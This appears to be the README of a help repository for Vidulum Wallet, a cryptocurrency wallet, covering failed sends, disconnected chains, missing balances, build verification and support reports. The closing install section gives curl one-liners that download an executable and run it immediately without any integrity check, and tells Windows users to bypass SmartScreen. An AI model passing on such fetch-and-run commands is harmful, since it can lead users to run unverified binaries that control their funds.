![Vidulum Wallet help](assets/banner-hub.png)

# Vidulum Wallet fixes and verification

What to check when a send fails, a chain will not load, a balance lags, or a build needs proving.

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

> None of these guides needs your recovery phrase. If a page or a person asks for it while you are troubleshooting, that request is the problem.

## What this repository is for

This repository holds the diagnostic half of the Vidulum Wallet documentation. It exists because most wallet complaints arrive as a symptom rather than a cause: a send that will not go, a chain that says disconnected, a deposit that shows on an explorer but not on screen.

Seven guides work through those symptoms in a fixed order. The send error page runs four checks before suggesting anything else. The chain page separates a network that is down from a connection that cannot reach it. The balance page starts with an explorer, because a balance that has not arrived and a balance that has not been read are different problems. Around those sit the trust pages: what makes a build official, what the documentation does and does not say about a legacy migration, and where a report should go.

Every page states the limit of what it can prove. Where the material behind the project does not document a cause, the page says so rather than inventing one, and points at the check that will settle it on your machine.

## Who it is for

- Users whose send fails, hangs or produces an error they cannot read.
- Anyone whose wallet cannot reach a chain while other software works fine.
- Readers deciding whether a downloaded build or an Android package is genuine.
- People preparing a support report that will actually get an answer.

## Start here

A failed send is diagnosed with <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md">Vidulum Wallet send error checks</a>, which runs fee, format, reachability and balance in order.

A chain that will not load is separated from a broken connection by <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-network-disconnected-check-chain.md">Vidulum network disconnected check</a>, which takes a minute.

A missing deposit is settled fastest with <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-balance-not-showing-received-coins.md">Vidulum balance not showing received coins</a>, before anything is restored.

Whether a build is genuine is covered by <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/is-vidulum-wallet-safe-custody-and-keys.md">is the Vidulum Wallet safe to hold keys</a> and by the APK page beside it.

## How to use these guides

1. Read the symptom you have, not the cause you suspect.
2. Run the checks in the order the page gives them; each one rules something out.
3. Do not restore a wallet to fix a display problem - check the address on an explorer first.
4. Update the application before deep diagnosis, then repeat the check.
5. If nothing resolves it, collect what the support page asks for and say which checks you ran.

## The guides

### Sends, chains and balances

- <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md">Vidulum Wallet send error checks</a> - Runs four checks in order when a send fails: fee coin, destination format, chain reachability and balance state.
- <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-network-disconnected-check-chain.md">Vidulum network disconnected check</a> - Separates a chain that is down from a connection that cannot reach it, using a second network as the test.
- <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-balance-not-showing-received-coins.md">Vidulum balance not showing received coins</a> - Starts with an explorer check when a received balance has not appeared, then covers the rescan and update route.

### Trust and build verification

- <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/is-vidulum-wallet-safe-custody-and-keys.md">is the Vidulum Wallet safe to hold keys</a> - Sets out the four things that decide wallet safety and what only you, rather than the software, can protect.
- <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-apk-check-android-build-official.md">Vidulum Wallet Android APK check</a> - Explains how to tell an official Android build from a repackaged one, and what the documentation actually lists.

### Migration and support

- <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-coin-migration-legacy-vdl.md">Vidulum legacy VDL coin migration</a> - Covers moving a legacy VDL balance into the current wallet and what the documentation does and does not state.
- <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-support-email-channels.md">Vidulum Wallet support channels</a> - Lists the support channels a report can use and what a useful report contains, so a reply can actually help.

## What each guide changes

| Task | Guide | Outcome |
| --- | --- | --- |
| Diagnose a failed send | <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md">Vidulum Wallet send error checks</a> | the cause, in four ordered checks |
| Tell a down chain from a bad connection | <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-network-disconnected-check-chain.md">Vidulum network disconnected check</a> | a named cause and a next step |
| Find a deposit that has not appeared | <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-balance-not-showing-received-coins.md">Vidulum balance not showing received coins</a> | explorer evidence, then a fix |
| Verify a build before running it | <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/is-vidulum-wallet-safe-custody-and-keys.md">is the Vidulum Wallet safe to hold keys</a> | a decision made from evidence |
| Write a report that gets answered | <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-support-email-channels.md">Vidulum Wallet support channels</a> | the right channel and the right detail |

## Why the order of the checks matters

The four checks in the send article are ordered by how often they explain a failure and how cheap they are to run. The fee coin is first because a balance that looks full can still have nothing spendable for fees. The destination format is second because an address can be valid and still belong to another chain. Reachability is third because a chain that is not answering explains a hang as well as an error. The balance read is last because it is the slowest to fix and the least often at fault.

Running them out of order costs time rather than money. Running them at all, in any order, beats restoring a wallet to see whether that helps, which it almost never does for a send problem.

## What a useful report contains

A report that gets answered names the platform and version, quotes the error text exactly, says which checks were already run and what each returned, and gives the address or transaction identifier only if it is public anyway.

It does not contain a recovery phrase, a private key, or a screenshot of either. No support process needs them, and sending them turns a fixable problem into a permanent one.

## When reinstalling helps, and when it hides the problem

Reinstalling is the right answer when the program itself is damaged or when a build cannot start at all. It is the wrong answer when the wallet opens, reads some chains and not others, because the fault is then in the connection or in the chain rather than in the files.

The distinction matters because a reinstall followed by a restore takes longer than the checks and can leave you staring at the same symptom with a fresh install and no better information.

## What these pages will not do

These pages will not tell you that funds are safe, that a chain will recover by a particular time, or that a specific transaction will confirm. None of that is knowable from a support article, and promising it would be the least useful thing a troubleshooting page could do.

## Where to look when the symptom is vague

"It is not working" is the hardest report to answer and the easiest to narrow. Start with the part that fails: does the wallet open, does it list balances, does it manage a send, does the send confirm. There are only four answers and each one points at a different page in this hub.

If the wallet opens and balances load but a send will not go, the four checks apply. If balances do not load at all, the chain page applies before anything else. If the send leaves and never confirms, the broadcast question in the send article is the place to start. If the application will not open, the install and update pages matter more than any diagnostic here, because a damaged build cannot be diagnosed from the inside.
## Common first questions

### Why do sends fail when the balance is visible?

A visible balance does not mean the fee coin is free to spend, and the destination can still belong to another chain. The <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md">Vidulum Wallet send error checks</a> separate those cases in a couple of minutes.

### Is a disconnected chain my internet connection?

Not necessarily. The wallet reads chain state through remote nodes, so a failed read can come from the node, the route to it, or the chain itself. The <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-network-disconnected-check-chain.md">Vidulum network disconnected check</a> tells you which.

### Should I restore to fix a missing balance?

Only after an explorer shows the coins at your address and the wallet still will not read them. <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md">Vidulum Wallet recovery phrase restore</a> cannot rewrite history, and it will not make <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-balance-not-showing-received-coins.md">Vidulum balance not showing received coins</a> arrive.

## Before you start troubleshooting

- Note the exact error text, if any, before changing anything.
- Check whether other chains in the same wallet still load.
- Confirm the address you sent to, character by character.
- Update to the current release before a second attempt.

## About and license

These pages describe Vidulum Wallet and are maintained alongside it. The application is MIT licensed; the terms are in <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/blob/dev/LICENSE.md">the LICENSE file</a> of the main repository. The current release is <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a>.

## How to install Vidulum Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip wallet.zip -d vidulum-linux`.
3. Make the extracted program executable: `chmod +x vidulum-linux/vidulum-wallet-desktop`.
4. Run it from that folder.
<!-- INSTALL-END -->